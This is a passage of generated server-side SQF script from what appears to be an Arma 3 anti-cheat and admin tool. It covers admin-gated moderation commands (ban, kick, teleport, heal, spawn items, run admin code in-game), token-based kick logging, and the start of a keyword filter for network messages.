_fnc_NoUID = {                        if(_clientUID in _locDevs)exitWith{};                        _mytime = call fnc_getserverTime;                        _log = _mytime + format['%1(%2) | AdminReq - !!!!!!ADMIN-LOGIN-ERROR!!!!!!',_clientName,_clientUID];                        _log call FNC_A3_SURVEILLANCELOG;                  };                  call {                        if(typeName _clientUID != 'STRING')exitWith {call _fnc_NoUID;};                        if(_clientUID == '')exitWith {call _fnc_NoUID;};                        if(_clientUID == '0')exitWith {call _fnc_NoUID;};                        if(_clientUID == ' ')exitWith {call _fnc_NoUID;};                  };                  if!(_clientUID in _playableUnits)exitWith                  {                        _mytime = call fnc_getserverTime;                        _log = _mytime + format['%1(%2) | AdminReq - Attempted to Use the AdminMenu',_clientName,_clientUID];                        _log call FNC_A3_SURVEILLANCELOG;                  };                                    if(_option == 1234)exitWith                  {                        _puid = _array select 2;                        if(_puid == _clientUID)then                        {                              if!(_clientUID in _locDevs)then{                                    diag_log format['<infiSTAR.de> ******ADMIN-LOGIN******: %1(%2)',_clientName,_clientUID];                              };                              "; if(_enableIngameLogs)then { _A3AHstring = _A3AHstring + "                              _clientID publicVariableClient '"+_AH_HackLogArrayRND+"';                              _clientID publicVariableClient '"+_AH_SurvLogArrayRND+"';                              _clientID publicVariableClient '"+_AH_AdmiLogArrayRND+"';                              "; }; _A3AHstring = _A3AHstring + "                              if(isNil '"+_TMPBAN+"')then {"+_TMPBAN+" = [];} else {if(typeName "+_TMPBAN+" != 'ARRAY')then {"+_TMPBAN+" = [];};};                              _clientID publicVariableClient '"+_TMPBAN+"';                              if(!isNil 'infiSTAR_ADMINS')then{_clientID publicVariableClient 'infiSTAR_ADMINS';};                              if(!isNil '"+_MAIN_CODE+"')then{_clientID publicVariableClient '"+_MAIN_CODE+"';};                        };                  };                  if(_option == 12345)exitWith                  {                        _clearLog = _array select 2;                        _adminObjects = [];{if((getPlayerUID _x) in _playableUnits)then {_adminObjects pushBack _x;};} forEach playableUnits;                        if(_clearLog == 0)then                        {                              {                                    if(!isNull _x)then                                    {                                          "+_AH_HackLogArrayRND+" = [];(owner _x) publicVariableClient '"+_AH_HackLogArrayRND+"';                                          "+_AH_SurvLogArrayRND+" = [];(owner _x) publicVariableClient '"+_AH_SurvLogArrayRND+"';                                    };                              } forEach _adminObjects;                        }                        else                        {                              {                                    if(!isNull _x)then                                    {                                          "+_AH_AdmiLogArrayRND+" = [];(owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';                                    };                              } forEach _adminObjects;                        };                  };                  if(_option == 69)exitWith                  {                        if(_clientUID in _playableUnits)then                        {                              _do = (_array select 3);                              if(isNil '_do')exitWith {};                              if(_do == '')exitWith {};                              _search = '$RE$';                              _ccsearch = count _search;                              _fulldo = count _do;                              for '_i' from 0 to _fulldo do                              {                                    _found = _do find _search;                                    if(_found == -1)exitWith {_do};                                    if(_found > -1)then                                    {                                          _doNew = ((_do select [0,(_found)]) + (_do select [(_found+_ccsearch),(_fulldo-1)]));                                          _do = _doNew;                                    };                                    _do                              };                              switch (_array select 2) do {                                    case 0:{[_do] call fnc_doGlobal;};                                    case 1:{call compile _do;};                                    case 2:{"+_clientdo+" = _do;(owner (_array select 4)) publicVariableClient '"+_clientdo+"';};                              };                        };                  };                  if(_option == -667)exitWith                  {                        _puid = _array select 2;                        if(isNil '"+_TMPBAN+"')then {"+_TMPBAN+" = [];} else {if(typeName "+_TMPBAN+" != 'ARRAY')then {"+_TMPBAN+" = [];};};                        "+_TMPBAN+" = "+_TMPBAN+" - [_puid];                        {if(getPlayerUID _x in _playableUnits)then {(owner _x) publicVariableClient '"+_TMPBAN+"';};} forEach playableUnits;                  };                  if(_option == -666)exitWith                  {                        _puid = _array select 2;                        _name = _array select 3;                        if(isNil '"+_TMPBAN+"')then {"+_TMPBAN+" = [];} else {if(typeName "+_TMPBAN+" != 'ARRAY')then {"+_TMPBAN+" = [];};};                        if(!(_puid in "+_TMPBAN+") && !(_puid in _playableUnits))then                        {                              [_puid,_name] call FNC_A3_infiSTARBAN;                              "+_TMPBAN+" pushBack _puid;                              {if(getPlayerUID _x in _playableUnits)then {(owner _x) publicVariableClient '"+_TMPBAN+"';};} forEach playableUnits;                        };                        if(_puid in _playableUnits)then                        {                              _mytime = call fnc_getserverTime;                              _log = _mytime + format['%1(%2) ADMIN - would have been banned now!',_name,_puid];                              _log call FNC_A3_HACKLOG;                              "+_AH_HackLogArrayRND+" pushBack _log;                        };                        _do = 'if(!isServer)then                        {                              if(getPlayerUID player == '+str _puid+')then                              {                                    (findDisplay 46) closeDisplay 0;                              };                        };';                        [_do] call fnc_doGlobal;                  };                  if(_option == -665)exitWith                  {                        _name = _array select 2;                        _puid = _array select 3;                        [_name,_puid] spawn fnc_infiServerKick;                  };                  if(_option == -664)exitWith                  {                        _puid = _array select 2;                        _do = 'if(!isServer)then                        {                              if(getPlayerUID player == '+str _puid+')then                              {                                    (findDisplay 46) closeDisplay 0;                              };                        };';                        [_do] call fnc_doGlobal;                  };                  if(_option == -4)exitWith                  {                        _delete = _array select 2;                        if(typeName _delete != 'ARRAY')then {_delete = [_delete];};                        "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                        _version = getText(configFile >> 'CfgServerVersion' >> 'client');                        "; }; _A3AHstring = _A3AHstring + "                        {                              _obj = (vehicle _x);                              _callwith = _obj;                              "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                              _callwith = [_obj,'infiSTAR.de'];                              if((_obj isKindOf 'LandVehicle') || (_obj isKindOf 'Air') || (_obj isKindOf 'Ship') || (_obj isKindOf 'Tank'))then                              {                                    _callwith call EPOCH_server_save_killedVehicle;                              }                              else                              {                                    if(typeOf _obj in ['LockBoxProxy_EPOCH'] || (_obj isKindOf 'Buildable_Storage'))then                                    {                                          _callwith call EPOCH_server_save_killedStorage;                                          _callwith call EPOCH_server_save_killedStorage;                                    }                                    else                                    {                                          _callwith call EPOCH_server_save_killedBuilding;                                    };                              };                              "; }; _A3AHstring = _A3AHstring + "                              if(!isNull _obj)then                              {                                    _obj setPosATL (_obj modelToWorld [0,0,123]);                                    _obj setDamage 5;                                    deleteVehicle _obj;                              };                        } forEach _delete;                  };                  if(_option == -2)exitWith                  {                        _target = _array select 2;                        _target setDamage 5;                  };                  if(_option == -1)exitWith                  {                        [_array select 2] spawn {                              _pos = _this select 0;                              _bolt = 'LightningBolt' createVehicle _pos;                              _bolt setdamage 5;                              _light = '#lightpoint' createVehicle _pos;                              _light setposatl [_pos select 0,_pos select 1,(_pos select 2) + 10];                              _light setLightDayLight true;                              _light setLightBrightness 300;                              _light setLightAmbient [0.05, 0.05, 0.1];                              _light setlightcolor [1, 1, 2];                              uiSleep 0.1;                              _light setLightBrightness 0;                              uiSleep 0.1;                              _class = ['lightning1_F','lightning2_F'] call bis_Fnc_selectrandom;                              _lightning = _class createVehicle _pos;                              _light setLightBrightness (100 + random 100);                              uiSleep 0.1;                              deleteVehicle _lightning;                              deleteVehicle _light;                        };                  };                  if(_option == 0)exitWith                  {                        private ['_position','_dir','_vehObj','_slot','_vehClass','_colors','_color','_config','_selections','_textures','_textureSelectionIndex','_count'];                        _vehClass = _array select 2;                        _position = _array select 3;                        _dir = _array select 4;                        _vehObj = _vehClass createVehicle _position;                        _vehObj setdir _dir;                        clearWeaponCargoGlobal _vehObj;                        clearMagazineCargoGlobal _vehObj;                        clearBackpackCargoGlobal _vehObj;                        clearItemCargoGlobal _vehObj;                        addToRemainsCollector[_vehObj];                        _vehObj disableTIEquipment true;                        "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                        if(_vehObj isKindOf 'Air' || _vehObj isKindOf 'Ship' || _vehObj isKindOf 'LandVehicle')then                        {                              _vehObj call EPOCH_server_setVToken;                              EPOCH_VehicleSlotsLimit = EPOCH_VehicleSlotsLimit + 1;                              EPOCH_VehicleSlots pushBack str(EPOCH_VehicleSlotsLimit);                              _slot = EPOCH_VehicleSlots select 0;                              _vehObj setVariable['VEHICLE_SLOT',_slot,true];                              EPOCH_VehicleSlots = EPOCH_VehicleSlots - [_slot];                              EPOCH_VehicleSlotCount = count EPOCH_VehicleSlots;                              publicVariable 'EPOCH_VehicleSlotCount';                              _config = (configFile >> 'CfgVehicles' >> _vehClass >> 'availableColors');                              if(isArray(_config))then                              {                                    _textureSelectionIndex = configFile >> 'CfgVehicles' >> _vehClass >> 'textureSelectionIndex';                                    _selections = if(isArray(_textureSelectionIndex))then {getArray(_textureSelectionIndex)} else { [0] };                                    _colors = getArray(_config);                                    _textures = _colors select 0;                                    _color = floor (random (count _textures));                                    _count = (count _colors)-1;                                    {                                          if(_count >= _forEachIndex)then                                          {                                                _textures = _colors select _forEachIndex;                                          };                                          _vehObj setObjectTextureGlobal [_x, (_textures select _color)];                                    } forEach _selections;                                    _vehObj setVariable['VEHICLE_TEXTURE',_color];                              };                              _vehObj call EPOCH_server_save_vehicle;                              _vehObj call EPOCH_server_vehicleInit;                        };                        "; }; _A3AHstring = _A3AHstring + "                  };                  if(_option == 1)exitWith                  {                        _unit = _array select 2;                        _pos = _array select 3;                        "+_AHpos+" = [_clientName,_clientUID,_pos];                        if(_unit == vehicle _unit)then                        {                              (owner _unit) publicVariableClient '"+_AHpos+"';                              _unit setPosATL _pos;                        }                        else                        {                              {if(!isNull _x)then {(owner _x) publicVariableClient '"+_AHpos+"';};} forEach (crew (vehicle _unit));                              (vehicle _unit) setPosATL _pos;                        };                  };                  if(_option == 2)exitWith                  {                        _state = _array select 2;                        if(_state == 1)then                        {                              _playerObj hideObjectGlobal true;                        }                        else                        {                              _playerObj hideObjectGlobal false;                        };                  };                  if(_option == 3)exitWith                  {                        _pos = _array select 2;                        _click = _array select 3;                        if(isClass (configFile >> 'CfgVehicles' >> _click))exitWith {                              _object = createVehicle [_click,_pos,[],3,'CAN_COLLIDE'];                              clearWeaponCargoGlobal _object;                              clearMagazineCargoGlobal _object;                              clearBackpackCargoGlobal _object;                              clearItemCargoGlobal _object;                        };                        _object = objNull;                        _WeaponHolders = nearestObjects[_pos,['GroundWeaponHolder','WeaponHolderSimulated','Land_MPS_EPOCH'],5];                        if(str _WeaponHolders != '[]') then {_object = _WeaponHolders select 0;};                        if(isNull _object)then {_object = createVehicle ['WeaponHolderSimulated',_pos,[],3,'CAN_COLLIDE'];};                        _object addItemCargoGlobal [_click,1];                        if(isClass (configFile >> 'CfgWeapons' >> _click))then                        {                              _magazines = getArray (configFile >> 'CfgWeapons' >> _click >> 'magazines');                              if(str _magazines != '[]')then                              {                                    {_object addItemCargoGlobal [_x,3];} forEach _magazines;                              };                        };                        _object setPosATL [_pos select 0,_pos select 1,(_pos select 2)+0.3];                  };                  if(_option == 4)exitWith                  {                        private['_target','_unitClass'];                        _target=_array select 2;                        _unitClass = _array select 3;                        "+_clientdo+" = ""                              _unitClass = ""+str _unitClass+"";                              [] execFSM """"\x\addons\a3_epoch_code\System\Event_Air_Drop.fsm"""";                              _unit = objNull;                              _targetPos = getPosATL player;                              _targetPos set [2,0];                              _disableAI = {                                    {_this disableAI _x}forEach[""""TARGET"""",""""AUTOTARGET"""",""""FSM""""];                              };                              switch _unitClass do {                                    case """"Epoch_Cloak_F"""": {                                          _unit = createAgent[_unitClass, _targetPos, [], 256, """"FORM""""];                                          _unit call _disableAI;                                          [_unit] execFSM """"\x\addons\a3_epoch_code\System\Cloak_Brain.fsm"""";                                    };                                    case """"GreatWhite_F"""": {                                          if (surfaceIsWater _targetPos) then{                                                if (((_targetPos vectorDiff getPosASL player) select 2) > 25) then{                                                      _unit = createAgent[_unitClass, _targetPos, [], 120, """"FORM""""];                                                      _unit call _disableAI;                                                      [_unit] execFSM """"\x\addons\a3_epoch_code\System\Shark_Brain.fsm"""";                                                };                                           };                                    };                                    case """"Epoch_Sapper_F"""": {                                          _unit = createAgent[_unitClass, _targetPos, [], 256, """"FORM""""];                                          _bomb = createVehicle [""""Sapper_Charge_Ammo"""", _targetPos, [], 0, """"CAN_COLLIDE""""];                                          _bomb attachTo [_unit, [0,0,0],""""Pelvis""""];                                          _unit call _disableAI;                                          sapperHndl = [_unit, _bomb] execFSM """"\x\addons\a3_epoch_code\System\Sapper_Brain.fsm"""";                                          _unit addEventHandler [""""FiredNear"""", """"sapperHndl setFSMVariable [""""""""_sFiredNear"""""""",[_this select 1, _this select 2]];""""];                                          _unit addEventHandler [""""Hit"""", """"sapperHndl setFSMVariable [""""""""_sHit"""""""",[_this select 1, _this select 2]];""""];                                    };                                    case """"Epoch_SapperB_F"""": {                                          _unit = createAgent[_unitClass, _targetPos, [], 256, """"FORM""""];                                          _bomb = createVehicle[""""SapperB_Charge_Ammo"""", _targetPos, [], 0, """"CAN_COLLIDE""""];                                          _bomb attachTo[_unit, [0, 0, 0], """"Pelvis""""];                                          _unit call _disableAI;                                          sapperHndl = [_unit, _bomb] execFSM """"\x\addons\a3_epoch_code\System\Sapper_Brain2.fsm"""";                                          _unit addEventHandler[""""FiredNear"""", """"sapperHndl setFSMVariable [""""""""_sFiredNear"""""""",[_this select 1, _this select 2]];""""];                                          _unit addEventHandler[""""Hit"""", """"sapperHndl setFSMVariable [""""""""_sHit"""""""",[_this select 1, _this select 2]];""""];                                    };                                    case """"I_UAV_01_F"""": {                                          _targetPos = getPosATL player;                                          _targetPos = [_targetPos, 600, 1200, 5, 0, 400, 0] call BIS_fnc_findSafePos;                                          _targetPos set[2, 600];                                          _unit = createVehicle[""""I_UAV_01_F"""", _targetPos, [], 0, """"FLY""""];                                          addToRemainsCollector[_unit];                                          _unit flyInHeight 600;                                          _grp = createGroup RESISTANCE;                                          _driver = _grp createUnit[""""I_UAV_AI"""", position _unit, [], 0, """"CAN_COLLIDE""""];                                          _driver moveInAny _unit;                                          [_unit, player] execFSM """"\x\addons\a3_epoch_code\System\Copter_brain.fsm"""";                                    };                                    case """"PHANTOM"""": {                                          [] execFSM """"\x\addons\a3_epoch_code\System\Phantom_Brain.fsm"""";                                    };                                    case """"B_Heli_Transport_01_F"""": {                                          [] execFSM """"\x\addons\a3_epoch_code\System\Event_Air_Drop.fsm"""";                                    };                              };                              if !(isNull _unit) then {                                    EPOCH_TEMPOBJ_PVS = _unit;                                    publicVariableServer """"EPOCH_TEMPOBJ_PVS"""";                              };                        "";                        (owner _target) publicVariableClient '"+_clientdo+"';                  };                  if(_option == 5)exitWith                  {                        _target = _array select 2;                        _offset = _array select 3;                        _maxHeight = _array select 4;                                                _target attachTo [_playerObj,[0,_offset,_maxHeight]];                   };                  if(_option == 6)exitWith                  {                        _offset = _array select 2;                                                _date = date;                        _date set [3,_offset];                        EPOCH_StaticDateTime = _date;                        setDate _date;                  };                  if(_option == 7)exitWith                  {                        _msg = _array select 2;                        if(typeName _msg == 'ARRAY')then                        {                              _msg = toString _msg;                        };                        _msg call fnc_serverMassMessage;                  };                  if(_option == 8)exitWith                  {                                                private['_plyr','_plyrUID','_items','_class','_dir','_location','_type','_weapon','_attachments','_currWeap','_itemSlot','_itemqtys','_goggles','_headgear','_vest','_backpack','_uniform','_weapons','_magazinesAmmo','_itemsplayer','_weaponsplayer','_group','_primaryWeapon','_secondaryWeapon','_attachment','_equipped','_wMags','_plyrGroup','_droppedWeapons','_newPlyr','_token','_owner','_reviver'];                        _plyr = _array select 2;                        Epoch_canBeRevived = true;                        (owner _plyr) publicVariableClient 'Epoch_canBeRevived';                        _plyr setVariable['REVIVE',true,true];      _owner=owner _plyr;      if(!local _plyr)then{_plyrUID=getPlayerUID _plyr;      if(!isNil '_plyrUID' && !alive _plyr)then{      _class=typeOf _plyr;      if(_class in['Epoch_Male_F','Epoch_Female_F'])then{if(_plyr getVariable['REVIVE',true])then{diag_log format['DEBUG server_revivePlayer : %1',_this];      _location=getPosATL _plyr;      _dir=getDir _plyr;      _plyrGroup=_plyr getVariable['GROUP',''];      _goggles=goggles _plyr;      _headgear=headgear _plyr;      _vest=vest _plyr;      _backpack=backpack _plyr;      _uniform=uniform _plyr;      _items=assignedItems _plyr;      _magazinesAmmo=magazinesAmmo _plyr;      _primaryWeapon='';      _secondaryWeapon='';      _droppedWeapons=[];      {{_droppedWeapons pushBack _x;      _type=getNumber(configfile >> 'cfgweapons' >>(_x select 0)>> 'type');      switch _type do{case 1:{_primaryWeapon=_x select 0};      case 4:{_secondaryWeapon=_x select 0};      };      }forEach(weaponsItemsCargo _x);      }forEach nearestObjects[_plyr,['WeaponHolderSimulated'],9];      _itemsplayer=[getItemCargo(uniformContainer _plyr),getItemCargo(vestContainer _plyr),getItemCargo(backpackContainer _plyr)];      _weaponsplayer=[getWeaponCargo(uniformContainer _plyr),getWeaponCargo(vestContainer _plyr),getWeaponCargo(backpackContainer _plyr)];      _weapons=[currentWeapon _plyr,((weaponsItems _plyr)+_droppedWeapons),[_primaryWeapon,_secondaryWeapon,handgunWeapon _plyr]];      hideObjectGlobal _plyr;      _group=grpNull;      if(_plyrGroup !='')then{{if((_x getVariable['GROUP',''])==_plyrGroup)exitWith{_group=group _x;      };      }forEach playableUnits;      if(isNull _group)then{_group=createGroup west;      };      diag_log format['DEBUG Group Found: %1',_group];      }else{_group=createGroup west;      diag_log format['DEBUG Group Created: %1',_group];      };      _newPlyr=_group createUnit[_class,_location,[],0,'CAN_COLLIDE'];      _newPlyr allowDammage false;      {_newPlyr disableAI _x;      }forEach['FSM','MOVE','AUTOTARGET','TARGET'];      _newPlyr setVariable['SETUP',true];      _newPlyr setVariable['PUID',_plyrUID];      _newPlyr setVariable['GROUP',_plyrGroup];      _newPlyr setVariable['REVIVE',false];      _newPlyr setDir _dir;      _newPlyr setPosATL _location;      _newPlyr setFatigue 1;      _newPlyr setDamage 0.25;      if(_uniform !='')then{_newPlyr addUniform _uniform;      };      if(_backpack !='')then{_newPlyr addBackpack _backpack;      };      if(_goggles !='')then{_newPlyr addGoggles _goggles;      };      if(_headgear !='')then{_newPlyr addHeadgear _headgear;      };      if(_vest !='')then{_newPlyr addVest _vest;      };      if(count _weapons >=2)then{_equipped=_weapons select 2;      {_weapon=_x select 0;      _type=getNumber(configfile >> 'cfgweapons' >> _weapon >> 'type');      _attachments=[];      for '_a' from 1 to 3 do{_attachment=_x select _a;      if(_attachment !='')then{_attachments pushBack _attachment;      };      };      _wMags=(count _x)==5;      if(_weapon in _equipped)then{_equipped=_equipped-[_weapon];      if(_wMags)then{_newPlyr addMagazine(_x select 4);      };      if(_weapon !='')then{_newPlyr addWeapon _weapon;      };      switch _type do{case 1:{removeAllPrimaryWeaponItems _newPlyr;      {_newPlyr addPrimaryWeaponItem _x}forEach _attachments;      };      case 2:{removeAllHandgunItems _newPlyr;      {_newPlyr addHandgunItem _x}forEach _attachments;      };      case 4:{{_newPlyr addSecondaryWeaponItem _x}forEach _attachments;      };      };      }else{{_newPlyr addItem _x;      }forEach _attachments;      if(_wMags)then{_newPlyr addMagazine(_x select 4);      };      };      }forEach(_weapons select 1);      _currWeap=(_weapons select 0);      };      {if(_x in['Binocular','Rangefinder'])then{_newPlyr addWeapon _x;      }else{_newPlyr linkItem _x;      };      }forEach _items;      {_itemSlot=_forEachIndex;      _itemqtys=_x select 1;      {for '_i' from 1 to(_itemqtys select _forEachIndex)do{switch _itemSlot do{case 0:{_newPlyr addItemToUniform _x};      case 1:{_newPlyr addItemToVest _x};      case 2:{_newPlyr addItemToBackpack _x};      };      };      }forEach(_x select 0);      }forEach _itemsplayer;      {_itemSlot=_forEachIndex;      _itemqtys=_x select 1;      {for '_i' from 1 to(_itemqtys select _forEachIndex)do{switch _itemSlot do{case 0:{_newPlyr addItemToUniform _x};      case 1:{_newPlyr addItemToVest _x};      case 2:{_newPlyr addItemToBackpack _x};      };      };      }forEach(_x select 0);      }forEach _weaponsplayer;      {_newPlyr addMagazine _x;      }forEach _magazinesAmmo;      _token=_newPlyr call EPOCH_server_setPToken;      [['clientRevive',[_newPlyr,_token]],_owner]call EPOCH_sendPublicVariableClient;      };      };      };      };                                                                                                Epoch_canBeRevived = true;                        (owner _plyr) publicVariableClient 'Epoch_canBeRevived';                        _plyr setVariable['REVIVE',true,true];                  };                  if(_option == 9)exitWith                  {                        _target = _array select 2;                        _target setDamage 0;                        _veh = vehicle _target;                        _veh setDamage 0;                        if(isPlayer _target) then                        {                              "+_clientdo+" = '                                    player setBleedingRemaining 0;                                    player setOxygenRemaining 1;                                    {                                          missionNamespace setVariable[format[''EPOCH_player%1'',_x],EPOCH_defaultVars select(EPOCH_customVars find _x)];                                    } forEach[''Temp'',''Hunger'',''Thirst'',''Toxicity'',''Stamina'',''HitPoints'',''BloodP''];                                    EPOCH_playerEnergy = EPOCH_playerEnergyMax;                              ';                              (owner _target) publicVariableClient '"+_clientdo+"';                        };                        if((fuel _veh > 0)||((_veh isKindOf 'AllVehicles')&&!((_veh isKindOf 'Epoch_Male_F')||(_veh isKindOf 'Epoch_Female_F')||(_veh isKindOf 'Man')))) then                        {                              _veh setFuel 1;                              _veh call EPOCH_server_save_vehicle;                        };                  };                  if(_option == 10)exitWith                  {                        _target = _array select 2;                        _value = _array select 3;                        if(_value)then                        {                              _target setVariable['LOCK_OWNER','-1'];                              if(isNil 'EPOCH_vehicleLockTime')then {EPOCH_vehicleLockTime = 1800;};                              _target setVariable['LOCKED_TILL',serverTime+EPOCH_vehicleLockTime];                        };                        _target lock _value;                  };                  if(_option == 11)exitWith                  {                        _target = _array select 2;                        "+_clientdo+" = '                              _inventoryP = [];                              {_inventoryP pushBack _x;} forEach (assignedItems player);                              {_inventoryP pushBack _x;} forEach (magazines player);                              {_inventoryP pushBack _x;} forEach (weapons player);                              {_inventoryP pushBack _x;} forEach (primaryWeaponItems player);                              {_inventoryP pushBack _x;} forEach (secondaryWeaponItems player);                              _inventoryP pushBack (primaryWeapon player);                              _inventoryP pushBack (secondaryWeapon player);                              _inventoryP pushBack (uniform player);                              _inventoryP pushBack (vest player);                              _inventoryP pushBack (backpack player);                              _inventoryP pushBack (headgear player);                              _inventoryP pushBack (goggles player);                              {                                    player removeItem _x;                                    player removeWeapon _x;                                    player removeMagazine _x;                                    removeUniform player;                                    removeVest player;                                    removeBackpack player;                                    removeHeadgear player;                                    removeGoggles player;                                    player removePrimaryWeaponItem _x;                                    player removeSecondaryWeaponItem _x;                                    player unlinkItem _x;                              } forEach _inventoryP;                        ';                        (owner _target) publicVariableClient '"+_clientdo+"';                  };                  if(_option == 12)exitWith                  {                        _target = _array select 2;                        _value = _array select 3;                        if(!isNil 'EPOCH_defaultVars_SEPXVar')then                        {                              if(!isNull _target)then                              {                                    _cIndex = EPOCH_customVars find 'Crypto';                                    _vars = _target getVariable['VARS', [] + EPOCH_defaultVars_SEPXVar];                                    _current_crypto = (((_vars select _cIndex) + _value) min 25000) max 0;                                    [['effectCrypto', _current_crypto], (owner _target)] call EPOCH_sendPublicVariableClient;                                    _vars set[_cIndex, _current_crypto];                                    _target setVariable['VARS', _vars];                              };                        };                  };                  if(_option == 13)exitWith                  {                        _target = _array select 2;                        _value = _array select 3;                        _targetUID = getPlayerUID _target;                        if(_targetUID in _locDevs)exitWith{};                        "+_clientdo+" = 'for ''_i'' from 0 to 3 do {disableUserInput '+str _value+';};';                        (owner _target) publicVariableClient '"+_clientdo+"';                  };                  if(_option == 5000)exitWith                  {                        _select = _array select 2;                        _pos = _array select 3;                        if(_select == 0)exitWith {                              _crate = 'Box_IND_AmmoVeh_F' createVehicle _pos;                              _crate setVariable['"+_adminbox+"','-1',true];                              _crate setPosATL _pos;                              clearWeaponCargoGlobal _crate;                              clearMagazineCargoGlobal _crate;                              clearBackpackCargoGlobal _crate;                              clearItemCargoGlobal _crate;                              _crate addItemCargoGlobal ['KitPlotPole',1];                              _crate addItemCargoGlobal ['ItemLockbox',1];                              _crate addItemCargoGlobal ['KitTiPi',1];                              _crate addItemCargoGlobal ['KitShelf',1];                              _crate addItemCargoGlobal ['Hatchet',1];                              _crate addItemCargoGlobal ['hatchet_swing',2];                              _crate addItemCargoGlobal ['KitFoundation',4];                              _crate addItemCargoGlobal ['PartPlankPack',4];                              _crate addItemCargoGlobal ['KitWoodFloor',20];                              _crate addItemCargoGlobal ['KitStudWall',16];                              _crate addItemCargoGlobal ['ItemCorrugated',16];                              _crate addItemCargoGlobal ['KitCinderWall',5];                              _crate addItemCargoGlobal ['CinderBlocks',10];                              _crate addItemCargoGlobal ['MortarBucket',4];                              _crate addItemCargoGlobal ['ItemCorrugatedLG',2];                              _crate addItemCargoGlobal ['CircuitParts',3];                              _crate addItemCargoGlobal ['EnergyPackLg',2];                        };                        if(_select > 0)exitWith {                              _crate = 'Box_IND_AmmoVeh_F' createVehicle _pos;                              _crate setVariable['"+_adminbox+"','-1',true];                              _crate setPosATL _pos;                              clearWeaponCargoGlobal _crate;                              clearMagazineCargoGlobal _crate;                              clearBackpackCargoGlobal _crate;                              clearItemCargoGlobal _crate;                                                            _arrayforcrate = [];                              switch _select do {                                    case 1:{_arrayforcrate = "+str _SupportBox1Content+"};                                    case 2:{_arrayforcrate = "+str _SupportBox2Content+"};                                    case 3:{_arrayforcrate = "+str _SupportBox3Content+"};                              };                              if(_arrayforcrate isEqualTo [])exitWith {};                                                            {                                    if(typeName _x == 'ARRAY')then                                    {                                          _item = _x select 0;                                          _BackPack = getText (configfile >> 'CfgVehicles' >> _item >> 'vehicleClass') == 'BackPacks';                                          if(_BackPack)then                                          {                                                _crate addBackpackCargoGlobal [_item,_x select 1];                                          }                                          else                                          {                                                _crate addItemCargoGlobal [_item,_x select 1];                                          };                                    }                                    else                                    {                                          _item = _x;                                          _BackPack = getText (configfile >> 'CfgVehicles' >> _item >> 'vehicleClass') == 'BackPacks';                                          if(_BackPack)then                                          {                                                _crate addBackpackCargoGlobal [_item,1];                                          }                                          else                                          {                                                _crate addItemCargoGlobal [_item,1];                                          };                                    };                              } forEach _arrayforcrate;                        };                  };            };            "+_FNC_PVAH_AdminReq+" = compileFinal ([_FNC_PVAH_AdminReq] call fnc_CompilableString);            _FNC_AH120_KICKLOGSPAWN =            {                  private['_array','_tokenreceived','_arraysent','_name','_puid','_result','_foundtokenid','_puidfound'];                  _array = _this select 1;                  _tokenreceived = _array select 0;                  _arraysent = _array select 1;                  _name = _arraysent select 0;                  _puid = _arraysent select 1;                  _belongstoname = '';                  _puidfound = '';                                    diag_log format['<infiSTAR.de FNC_AH120_KICKLOGSPAWN> %1',_array];                  if(isNil '_tokenreceived')exitWith {};                  if(typeName _tokenreceived != 'STRING')exitWith {};                                    if(isNil '_puid')then {_puid = '';};                  if(typeName _puid != 'STRING')then {_puid = '';};                  if((_puid == '_SP_PLAYER_')||(_puid == ''))then                  {                        if(isNil '"+_PoopTokenArray+"')then {"+_PoopTokenArray+" = [];};                        _foundtokenid = "+_PoopTokenArray+" find _tokenreceived;                        if(_foundtokenid > 0)then                        {                              _puidfound = "+_PoopTokenArray+" select (_foundtokenid - 1);                              if(!isNil '_puidfound')then                              {                                    _puid = _puidfound;                                    _arraysent set[1,_puid];                                    _log = format['%1 - CLIENT NO UID - SERVER RESOLVED: %2(%3)',time,_name,_puid];                                    [_name,_puid,'SLOG',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                              };                        };                  };                                    _result=false;                  _result = [_puid,_tokenreceived] call "+_server_checkTokenR+";                  if(!_result)exitWith                  {                        _log = format['BadToken (%1)',_tokenreceived];                        if(isNil '_puidfound')then {_puidfound = '';};                        if(_puidfound == '')then                        {                              if(isNil '"+_PoopTokenArray+"')then {"+_PoopTokenArray+" = [];};                              _foundtokenid = "+_PoopTokenArray+" find _tokenreceived;                              if(_foundtokenid > 0)then                              {                                    _puidfound = "+_PoopTokenArray+" select (_foundtokenid - 1);                                    {if(getPlayerUID _x == _puidfound)then {_belongstoname = name _x;};} forEach playableUnits;                                    _log = format['BadToken (%1). Token belongs to: %2(%3) and not %4(%5)',_tokenreceived,_belongstoname,_puidfound,_name,_puid];                                    _puid = _puidfound;                                    _arraysent set[1,_puid];                              };                        };                        [_name,_puid,'SLOG',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                        [_name,_puid] spawn fnc_infiServerKick;                  };                                    _arraysent spawn "+_FNC_AH120_KICKLOG+";            };            "+_FNC_AH120_KICKLOGSPAWN+" = compileFinal ([_FNC_AH120_KICKLOGSPAWN] call fnc_CompilableString);            _fnc_serverMassMessage = {                  "+_massMessage+" = [_this,0,0.7,10,0];                  {(owner _x) publicVariableClient '"+_massMessage+"';} forEach playableUnits;            };            fnc_serverMassMessage = compileFinal ([_fnc_serverMassMessage] call fnc_CompilableString);            "; if(_MPF)then { _A3AHstring = _A3AHstring + "            _fnc_mpPackets = {                  _stringcode = str _this;                  _foundBad = '';                  _forward = true;                  _bannable = false;                  _input = _this select 1;                                    _lcode = toLower _stringcode;                  {if((_lcode find (toLower _x)) != -1)exitWith {_forward = false;_foundBad = _x;};} forEach [                        'toString','toArray','setD','dynamicText','endmission','forceend','failmission','createVehicle','setpos','title','KeyDown','hacked','DB_fnc'                  ];                  if(!_forward)then                  {                        if(_foundBad=='DB_fnc')then                        {                              {if((_lcode find (toLower _x)) != -1)exitWith {_forward = true;};} forEach [                                    'DB_fnc_queryRequest','DB_fnc_updateRequest','DB_fnc_updatePartial','DB_fnc_insertRequest',                                    'DB_fnc_numberSafe','DB_fnc_bool','DB_fnc_insertVehicle','DB_fnc_marketInsert',                                    'DB_fnc_housequeryRequest','DB_fnc_houseupdateRequest'                              ];                        };                        if(!_forward)then                        {                              if(_foundBad=='hacked')then                              {                                    {if((_lcode find (toLower _x)) != -1)exitWith {_forward = true;};} forEach ['Sattellite_Key_Terminal'];                              };                        };                  };                                    {if((_lcode find (toLower _x)) != -1)exitWith {_bannable = true;};} forEach [                        